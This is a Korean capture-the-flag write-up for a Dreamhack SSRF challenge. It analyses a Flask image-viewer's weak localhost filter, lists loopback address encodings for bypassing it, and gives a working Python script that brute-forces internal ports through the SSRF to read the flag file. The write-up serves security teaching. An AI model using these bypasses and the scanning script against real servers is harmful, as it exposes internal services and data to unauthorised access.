## Concept
SSRF (Server-Side Request Forgery)는 **서버 측에서 위조된 HTTP 요청을 보내도록 유도하는 취약점**입니다. 공격자는 서버의 권한을 이용해 외부에서 접근할 수 없는 *내부망 시스템이나 로컬 리소스에 접근*할 수 있습니다.

## 서비스 분석
### 문제
web-ssrf 문제는 flask로 작성된 image viewer 서비스로 /app/flag.txt에 플래그가 위치한다.
### 기능분석
```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

SSRF는 서버와 서버사이의 통신(요청, 응답)에 공격자가 입력할수 있는 필드가 있을때 URL경로를 조작하여 원래는 접근할수 없는 서버 내부의 리소스에 접근하는 공격이다. `/image_viewer`에는 `127.0.0.1`과 `localhost`를 필터링하고 있어 필터링된 문자를 url에 입력해서는 내부 서비스에 접근할수 없다. *URL Filtering Bypass*를 하여 내부서비스에 요청을 보내면 되는데 다양한 방법이 있다.
```
대체 IP표현식
1. IP축약 - 127.1 == 127.0.1 == 127.0.0.1 == localhost
2. 0 wnth - 대부분의 리눅스 환경에서 http://0.0.0은 Localhost로 라우팅된다
3. 16진수 인코딩 - http://0x7f000001
4. 8진수 인코딩 - http://0177.0000.0000.0001 , http://017700000001
5. 정수형 인코딩 - http://2130706433 (32bit INT)
6. IPv6 표현식 - http://[::1] , http://[::]
```

### 익스플로잇
공격흐름: SSRF로 서버의 내부 서비스에 요청보내도록 url조작, URL Filtering Bypass -> Bruteforce(Port Finding) --> flag획득

URL Filtering Bypass로 서버가 로컬(내부 서비스)로 요청을 보내게 하면 되는데
```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
```

이처럼 1500-1800 사이의 포트를 랜덤하게 사용하고 있기에 일일이 요청을 보내는 방법은 무모하다고 볼수 있다. 대신 브루트포싱을 하는 코드를 짜서 자동으로 요청을 보내고 에러가 아닌 응답을 표시하자.

![dataform](/assets/img/posts/ssrf/dataform.png)
HTML소스 내 Base64 데이터를 추출해야하는데 정상적으로 서비스를 이용해서 img가 반환될때를 보면 src="data:image/png;base64, {data}" 형태다. 따라서 이 형태에 맞는 데이터를 매치하면 된다.

```python
import requests
import base64
import re

TARGET_URL = "http://host8.dreamhack.games:22997/img_viewer"

print("[+] SSRF 포트 스캔을 시작합니다 (1500 ~ 1800)...")

# 1500번부터 1800번 포트까지 순회
for port in range(1500, 1801):
    # '127.0.0.1' 필터링 우회
    payload_url = f"http://127.1:{port}/flag.txt"
    
    form_data = {
        "url": payload_url
    }
    
    try:
        # Flask 웹 서버로 POST 요청 전송 
        response = requests.post(TARGET_URL, data=form_data, timeout=2)
        
        # 정규표현식을 사용해 응답 HTML 소스 내 Base64 데이터 추출
        match = re.search(r'src="data:image/png;base64,\s*([^"]+)"', response.text)
        
        if match:
            base64_data = match.group(1)
            
            if len(base64_data) < 2000:
                # 추출한 Base64 문자열을 바이트로 변환 후 디코딩
                decoded_bytes = base64.b64decode(base64_data)
                decoded_text = decoded_bytes.decode('utf-8', errors='ignore')
                
                # 드림핵 플래그 포맷(DH{)이 포함되어 있는지 검증
                if "DH{" in decoded_text or "flag" in decoded_text.lower():
                    print(f"\n[★] 성공! 구동 중인 내부 포트 발견: {port}")
                    print(f"[★] 획득한 플래그: {decoded_text.strip()}")
                    break # 플래그를 발견했으므로 반복문 종료
                    
    except requests.exceptions.RequestException:
        # 네트워크 지연이나 에러 발생 시 무시하고 다음 포트로 진행
        continue

print("\n[+] 스캔이 완료되었습니다.")

```
